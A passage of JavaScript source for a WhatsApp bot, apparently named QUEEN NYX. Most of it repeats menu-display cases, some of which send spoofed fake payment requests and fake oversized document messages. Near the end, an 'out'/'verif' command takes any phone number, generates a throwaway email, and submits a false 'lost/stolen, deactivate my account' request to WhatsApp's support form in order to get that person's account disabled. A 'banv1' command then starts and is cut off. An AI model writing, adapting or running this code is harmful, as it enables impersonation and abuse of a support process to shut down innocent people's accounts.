      thumbnailUrl: 'https://files.catbox.moe/kp8w9p.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'ephoto360menu': {
    let ownerName = global.ownerName || 'Unknown'; // Owner's name from settings.js
    let timestampe = speed();
    let latensie = speed() - timestampe;
    let uptime = process.uptime();
    let uptimeString = `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m ${Math.floor(uptime % 60)}s`;
    let date = new Date().toLocaleString('en-US', { timeZone: 'UTC' });

    let xmenu_oh = `
╭━━ ⪩⪨ 𝗘𝗣𝗛𝗢𝗧𝗢𝟯𝟲𝟬 𝗠𝗘𝗡𝗨 🎨 ⪩⪨ ━━╮
┃ 🔰 *Dev:* Precious Ayomide👑
┃ 👑 *Owner:* ${ownerName}
┃ 🛠 *Mode:* Public
┃ ⚡ *Latency:* ${latensie}ms
┃ ⏳ *Uptime:* ${uptimeString}
┃ 📆 *Date:* ${date}
╰━━━━━━━━━━━━━━━━╯

🌟 *Welcome to the EPHOTO360 MENU!* 🌟  
This section contains commands to generate stunning text effects.  

📜 **Available Ephoto360 Commands:**  
${readmore}\n\n${ephoto360menu(prefix, hituet)}`
if (typemenu === 'v1') {
                    PrexzyVilla.sendMessage(m.chat, {
                        image: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    PrexzyVilla.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    PrexzyVilla.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    PrexzyVilla.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    PrexzyVilla.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	PrexzyVilla.sendMessage(m.chat, {
      video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/kp8w9p.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'nsfwmenu': {
    let ownerName = global.ownerName || 'Unknown'; // Owner's name from settings.js
    let timestampe = speed();
    let latensie = speed() - timestampe;
    let uptime = process.uptime();
    let uptimeString = `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m ${Math.floor(uptime % 60)}s`;
    let date = new Date().toLocaleString('en-US', { timeZone: 'UTC' });

    let xmenu_oh = `
╭━━ ⪩⪨ 𝗡𝗦𝗙𝗪 𝗠𝗘𝗡𝗨 🔞 ⪩⪨ ━━╮
┃ 🔰 *Dev:* Precious Ayomide👑
┃ 👑 *Owner:* ${ownerName}
┃ 🛠 *Mode:* Public
┃ ⚡ *Latency:* ${latensie}ms
┃ ⏳ *Uptime:* ${uptimeString}
┃ 📆 *Date:* ${date}
╰━━━━━━━━━━━━━━━━╯

🌟 *Welcome to the NSFW MENU!* 🌟  
This section contains NSFW-related commands. **Use responsibly.**  

📜 **Available NSFW Commands:**  
${readmore}\n\n${nsfwmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    PrexzyVilla.sendMessage(m.chat, {
                        image: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    PrexzyVilla.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    PrexzyVilla.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    PrexzyVilla.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    PrexzyVilla.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	PrexzyVilla.sendMessage(m.chat, {
      video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/kp8w9p.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'animemenu': {
    let ownerName = global.ownerName || 'Unknown'; // Owner's name from settings.js
    let timestampe = speed();
    let latensie = speed() - timestampe;
    let uptime = process.uptime();
    let uptimeString = `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m ${Math.floor(uptime % 60)}s`;
    let date = new Date().toLocaleString('en-US', { timeZone: 'UTC' });

    let xmenu_oh = `
╭━━ ⪩⪨ 𝗔𝗡𝗜𝗠𝗘 𝗠𝗘𝗡𝗨 🎌 ⪩⪨ ━━╮
┃ 🔰 *Dev:* Precious Ayomide👑
┃ 👑 *Owner:* ${ownerName}
┃ 🛠 *Mode:* Public
┃ ⚡ *Latency:* ${latensie}ms
┃ ⏳ *Uptime:* ${uptimeString}
┃ 📆 *Date:* ${date}
╰━━━━━━━━━━━━━━━━╯

🌟 *Welcome to the ANIME MENU!* 🌟  
This section contains commands related to anime content.  

📜 **Available Anime Commands:**  
${readmore}\n\n${animemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    PrexzyVilla.sendMessage(m.chat, {
                        image: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    PrexzyVilla.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    PrexzyVilla.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    PrexzyVilla.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    PrexzyVilla.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	PrexzyVilla.sendMessage(m.chat, {
      video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/kp8w9p.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'stickermenu': {
    let ownerName = global.ownerName || 'Unknown'; // Owner's name from settings.js
    let timestampe = speed();
    let latensie = speed() - timestampe;
    let uptime = process.uptime();
    let uptimeString = `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m ${Math.floor(uptime % 60)}s`;
    let date = new Date().toLocaleString('en-US', { timeZone: 'UTC' });

    let xmenu_oh = `
╭━━ ⪩⪨ 𝗦𝗧𝗜𝗖𝗞𝗘𝗥 𝗠𝗘𝗡𝗨 🏷 ⪩⪨ ━━╮
┃ 🔰 *Dev:* Precious Ayomide👑
┃ 👑 *Owner:* ${ownerName}
┃ 🛠 *Mode:* Public
┃ ⚡ *Latency:* ${latensie}ms
┃ ⏳ *Uptime:* ${uptimeString}
┃ 📆 *Date:* ${date}
╰━━━━━━━━━━━━━━━━╯

🌟 *Welcome to the STICKER MENU!* 🌟  
This section contains commands to create and modify stickers.  

📜 **Available Sticker Commands:**  
${readmore}\n\n${stickermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    PrexzyVilla.sendMessage(m.chat, {
                        image: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    PrexzyVilla.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    PrexzyVilla.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    PrexzyVilla.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    PrexzyVilla.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	PrexzyVilla.sendMessage(m.chat, {
      video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/kp8w9p.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'databasemenu': {
    let ownerName = global.ownerName || 'Unknown'; // Owner's name from settings.js
    let timestampe = speed();
    let latensie = speed() - timestampe;
    let uptime = process.uptime();
    let uptimeString = `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m ${Math.floor(uptime % 60)}s`;
    let date = new Date().toLocaleString('en-US', { timeZone: 'UTC' });

    let xmenu_oh = `
╭━━ ⪩⪨ 𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘 𝗠𝗘𝗡𝗨 🗄 ⪩⪨ ━━╮
┃ 🔰 *Dev:* Precious Ayomide👑
┃ 👑 *Owner:* ${ownerName}
┃ 🛠 *Mode:* Public
┃ ⚡ *Latency:* ${latensie}ms
┃ ⏳ *Uptime:* ${uptimeString}
┃ 📆 *Date:* ${date}
╰━━━━━━━━━━━━━━━━╯

🌟 *Welcome to the DATABASE MENU!* 🌟  
This section contains commands to manage database files and storage.  

📜 **Available Database Commands:**  
${readmore}\n\n${databasemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    PrexzyVilla.sendMessage(m.chat, {
                        image: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    PrexzyVilla.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    PrexzyVilla.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    PrexzyVilla.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    PrexzyVilla.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	PrexzyVilla.sendMessage(m.chat, {
      video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/kp8w9p.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'aimenu': {
    let ownerName = global.ownerName || 'Unknown'; // Owner's name from settings.js
    let timestampe = speed();
    let latensie = speed() - timestampe;
    let uptime = process.uptime();
    let uptimeString = `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m ${Math.floor(uptime % 60)}s`;
    let date = new Date().toLocaleString('en-US', { timeZone: 'UTC' });

    let xmenu_oh = `
╭━━ ⪩⪨ 𝗔𝗜 𝗠𝗘𝗡𝗨 🤖 ⪩⪨ ━━╮
┃ 🔰 *Dev:* Precious Ayomide👑
┃ 👑 *Owner:* ${ownerName}
┃ 🛠 *Mode:* Public
┃ ⚡ *Latency:* ${latensie}ms
┃ ⏳ *Uptime:* ${uptimeString}
┃ 📆 *Date:* ${date}
╰━━━━━━━━━━━━━━━━╯

🌟 *Welcome to the AI MENU!* 🌟  
This section contains AI-powered features, including chatbots and automation.  

📜 **Available AI Commands:**  
${readmore}\n\n${aimenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    PrexzyVilla.sendMessage(m.chat, {
                        image: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    PrexzyVilla.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    PrexzyVilla.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    PrexzyVilla.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    PrexzyVilla.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	PrexzyVilla.sendMessage(m.chat, {
      video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/kp8w9p.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'raremenu': {
    let ownerName = global.ownerName || 'Unknown'; // Owner's name from settings.js
    let timestampe = speed();
    let latensie = speed() - timestampe;
    let uptime = process.uptime();
    let uptimeString = `${Math.floor(uptime / 3600)}h ${Math.floor((uptime % 3600) / 60)}m ${Math.floor(uptime % 60)}s`;
    let date = new Date().toLocaleString('en-US', { timeZone: 'UTC' });

    let xmenu_oh = `
╭━━ ⪩⪨ 𝗥𝗔𝗥𝗘 𝗠𝗘𝗡𝗨 🏆 ⪩⪨ ━━╮
┃ 🔰 *Dev:* Precious Ayomide👑
┃ 👑 *Owner:* ${ownerName}
┃ 🛠 *Mode:* Public
┃ ⚡ *Latency:* ${latensie}ms
┃ ⏳ *Uptime:* ${uptimeString}
┃ 📆 *Date:* ${date}
╰━━━━━━━━━━━━━━━━╯

🌟 *Welcome to the RARE MENU!* 🌟  
This section contains special or rare commands that are unique to QUEEN NYX.  

📜 **Available Rare Commands:**  
${readmore}\n\n${raremenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    PrexzyVilla.sendMessage(m.chat, {
                        image: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    PrexzyVilla.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    PrexzyVilla.sendMessage(m.chat, {
                        video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    PrexzyVilla.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    PrexzyVilla.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    PrexzyVilla.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./PrexzyMedia/theme/nyxpic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	PrexzyVilla.sendMessage(m.chat, {
      video: fs.readFileSync('./PrexzyMedia/theme/Nyx-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/kp8w9p.jpeg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
            case 'checkaccount':
            case 'account': {
               let a = db.data.users[sender]
               let b = `Below is your account information\n`
               b += `================================\n`
               b += `Serial Code:\n*[${a.serialNumber}]*\n`
               b += `Title: ${a.title}\n`
               b += `Afk Time: ${a.afkTime}\n`
               b += `Afk Reason: ${a.afkReason}\n` 
               b += `Nickname: ${a.nick}\n`
               b += `Premium Status: ${a.premium}\n`
               b += `Your Limit: ${a.limit}\n`
               b += `================================`
               PrexzyVilla.sendMessage(sender, { text: b }, { quoted: m })
               replygcprexzy('Account Details Has Been Sent In Private Chat')
            }
            break
            case 'limit':
            case 'checklimit': {
               let a = db.data.users[sender]
               let b = `Your Limit ${a.limit}\n` 
               b += `Premium Status ${isPrem ? 'On' : 'Off' }\n` 
               b += `Serial Code:\n*[${a.serialNumber}]*\n`
               replygcprexzy(b)
            }
            break
            
//ban/unban cases
case 'out': case 'verif':{
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcprexzy(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let prexzynumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let prexzytesx = await PrexzyVilla.onWhatsApp(prexzynumx)
if (prexzytesx.length == 0) return replygcprexzy(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let prexzyxos = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = prexzyxos.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(prexzyxos.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", prexzynumx)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
PrexzyVilla.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv1': {
if (!isPremium) return replyprem(mess.premium)
if (!args[0]) return replygcprexzy(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let prexzynumx = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let prexzytesx = await PrexzyVilla.onWhatsApp(prexzynumx)
if (prexzytesx.length == 0) return replygcprexzy(`Enter a valid and registered number on WhatsApp!!!`)
